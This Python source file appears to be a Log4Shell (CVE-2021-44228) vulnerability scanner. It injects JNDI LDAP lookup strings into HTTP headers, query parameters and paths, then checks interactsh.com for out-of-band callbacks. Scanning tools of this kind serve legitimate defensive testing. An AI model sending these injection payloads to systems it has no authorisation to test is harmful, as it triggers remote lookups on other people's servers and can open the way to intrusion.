#!/usr/bin/env python3
# coding=utf-8

import argparse
import time
import uuid
from termcolor import cprint
import requests
from urllib import parse
import base64
import json
import random
from uuid import uuid4
from base64 import b64encode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256

# Disable insecure SSL warning
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

TESTING_HOST = "localhost:1389"
TESTING_PAYLOAD = "${jndi:ldap://HOST/ID}"
INTERACTSH_PAYLOAD = "${jndi:ldap://HOST}"
OUTPUT_FILE = "ids.csv"
HEADERS = [
    "user-agent",
    "X-Api-Version",
    "referer",
    "x-forwarded-for"
]

# Reference: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
class Interactsh:
    def __init__(self, token=None, server=None):
        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = server or 'interactsh.com'
        self.server = self.server.lstrip()
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid4())
        self.encoded = b64encode(self.public_key).decode("utf8")
        guid = uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlation_id = self.domain[:20]

        self.session = requests.session()
        self.session.headers = self.headers
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        res = self.session.post(
            f"https://{self.server}/register", headers=self.headers, json=data, verify=False)
        if 'success' not in res.text:
            cprint(f"[!] {res.text}", color="red")

    def poll(self):
        count = 3
        result = []
        while count:

            try:
                url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
                res = self.session.get(url, headers=self.headers, verify=False).json()
                aes_key, data_list = res['aes_key'], res['data']
                for i in data_list:
                    decrypt_data = self.decrypt_data(aes_key, i)
                    result.append(decrypt_data)
                return result
            except Exception as e:
                #logger.debug(e)
                count -= 1
                time.sleep(1)
                continue
        return []

    def decrypt_data(self, aes_key, data):
        private_key = RSA.importKey(self.private_key)
        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
        decode = base64.b64decode(data)
        bs = AES.block_size
        iv = decode[:bs]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def build_payload(self, flag):
        """
        Generate the url and flag for verification
        :param length: The flag length
        :param method: Request type (dns|https|http), the default is https
        :return: dict { url: Return the request url, flag: Return a random flag }
        Example:
          {
            'url': 'http://hqlbbwmo8u.7735s13s04hp4eu19s4q8n963n73jw6hr.interactsh.com',
            'flag': 'hqlbbwmo8u'
          }
        """
        url = f'{flag}.{self.domain}'
        return INTERACTSH_PAYLOAD.replace("HOST", url)

    def verify(self, flag, get_result=False):
        """
        Check the flag
        :param flag: The flag to verify
        :param get_result: Whether to return detailed results
        :return: Boolean
        """
        result = self.poll()
        for item in result:
            if flag.lower() in item['full-id']:
                return (True, result) if get_result else True
        return (False, result) if get_result else False


def get_arguments():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--filename",
                       action="store",
                       dest="filename",
                       help="file to use as a source of endpoints (format IP:PORT)")
    group.add_argument("-e", "--endpoint",
                       action="store",
                       dest="endpoint",
                       help="endpoint to test")
    parser.add_argument("--http",
                        action="store_true",
                        help="Test HTTP schema")
    parser.add_argument("--https",
                        action="store_true",
                        help="Test HTTPS schema")
    parser.add_argument("-p", "--payload",
                        action="store",
                        default=TESTING_PAYLOAD,
                        help="template of the testing payload to use")
    parser.add_argument("--host",
                        action="store",
                        default=TESTING_HOST,
                        dest="host",
                        help="host to replace in the HOST placeholder in the payload template")
    parser.add_argument("-o", "--output",
                        action="store",
                        default=OUTPUT_FILE,
                        help="output file on which will be saved the endpoint-ID mappings",
                        dest="output")
    parser.add_argument("-t", "--timeout",
                        action="store",
                        default=10,
                        help="request timeout",
                        dest="timeout",
                        type=int)
    parser.add_argument("-v", "--verbose",
                        action="store_true",
                        dest="verbose",
                        help="verbose logging")
    parser.add_argument("--headers-file",
                        action="store",
                        dest="headers",
                        help="file with a list of header to test")
    parser.add_argument("--auto",
                        action="store_true",
                        dest="auto",
                        help="use interact.sh to automatically verify if vulnerable")
    test_group = parser.add_argument_group("Tests", "[default: Headers, Query, Path]")
    test_group.add_argument("--headers",
                            action="append_const",
                            dest="tests",
                            const="Headers",
                            help="test headers injection like user-agent and referer, default is ids.csv")
    test_group.add_argument("--query",
                            action="append_const",
                            dest="tests",
                            const="Query",
                            help="test query injection in GET request as id parameter")
    test_group.add_argument("--path",
                            action="append_const",
                            dest="tests",
                            const="Path",
                            help="test path injection")
    args = parser.parse_args()
    if args.tests is None:
        args.tests = ["Headers", "Query", "Path"]
    return args


def read_file_rows(file):
    rows = []
    with open(file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            rows.append(i)
    return rows


def get_entries(filename):
    with open(filename) as file:
        lines = file.readlines()
        lines = [line.rstrip() for line in lines]
        return lines


def build_testing_payload(id, host, payload):
    return payload.replace("HOST", host).replace("ID", id)


def generate_endpoint_id(endpoint):
    return uuid.uuid4().hex


def generate_mappings(endpoints):
    return {generate_endpoint_id(endpoint): endpoint for endpoint in endpoints}


def test_entry(endpoint, payload, id, args):
    cprint(f"[*] [ID: {id}] Testing endpoint {endpoint}", "green")
    if args.verbose:
        cprint(f" [%] Payload: {testing_payload}", color="cyan")
    for test_key, test_fun in TESTS_LIST:
        try:
            test_fun(endpoint, payload, args)
        except Exception as e:
            cprint(f" [!] [{test_key}] Test failed with: {e}", color="red")


def get_endpoints_from_entries(entries, http, https):
    endpoints = []
    for entry in entries:
        if entry.startswith("http://") or entry.startswith("https://"):
            endpoints.append(entry)
            break

        if http:
            endpoints.append("http://" + entry)
        if https:
            endpoints.append("https://" + entry)
        if not http and not https:
            endpoints.append("http://" + entry)
            endpoints.append("https://" + entry)
    return endpoints


def log_mappings(mappings):
    cprint(f"[*] Endpoint-ID mapping (exported in {OUTPUT_FILE}):", color="cyan", attrs=["bold", "underline"])
    for id, endpoint in mappings.items():
        cprint(f" - {endpoint} -> {id}", color="white")


def generate_mapping_file(mappings, output):
    with open(output, "w") as f:
        f.writelines([f"{id},{endpoint}\n" for id, endpoint in mappings.items()])


# Tests
def test_header(endpoint, payload, args):
    if args.headers is not None:
        headers = read_file_rows(args.headers)
    else:
        headers = HEADERS

    headers = {header: payload for header in headers}
    requests.get(endpoint, headers=headers, verify=False, timeout=args.timeout)


def test_get(endpoint, payload, args):
    params = {"id": payload}
    requests.get(endpoint, params=params, verify=False, timeout=args.timeout)


def test_path(endpoint, payload, args):
    url = parse.urljoin(endpoint, parse.quote(payload, safe=''))
    requests.get(url, verify=False, timeout=args.timeout)


TESTS_LIST = [("Headers", test_header),
              ("Query", test_get),
              ("Path", test_path)]


# MAIN
if __name__ == '__main__':
    args = get_arguments()
    cprint("[*] CVE-2021-44228 - Apache Log4j RCE Scanner", color="yellow")
    cprint("[*] Developed by Federico Rapetti for Reply Communication Valley", color="yellow")
    print()
    if args.filename is not None:
        entries = get_entries(args.filename)
    else:
        entries = [args.endpoint]
    mappings = generate_mappings(get_endpoints_from_entries(entries, args.http, args.https))
    log_mappings(mappings)
    generate_mapping_file(mappings, args.output)
    print("")

    cprint("[*] Start testing", color="magenta", attrs=["bold", "underline"])
    if args.auto:
        cprint("[*] Initialize interact.sh", color="blue")
        service = Interactsh()

    for id, endpoint in mappings.items():
        if args.auto:
            testing_payload = service.build_payload(id)
        else:
            testing_payload = build_testing_payload(id, args.host, args.payload)

        test_entry(endpoint, testing_payload, id, args)

    if args.auto:
        print()
        cprint("[*] Start verification", color="magenta", attrs=["bold", "underline"])
        logs = service.poll()
        endpoints = {mappings[log["full-id"].split(".")[0]] for log in logs}

        if len(endpoints) > 0:
            cprint("[!!!] Vulnerable endpoints found!", color="red", attrs=["bold"])
            for endpoint in endpoints:
                cprint(f" - {endpoint}", color="red")
        else:
            cprint("[✔] No vulnerable endpoints found!", color="green", attrs=["bold"])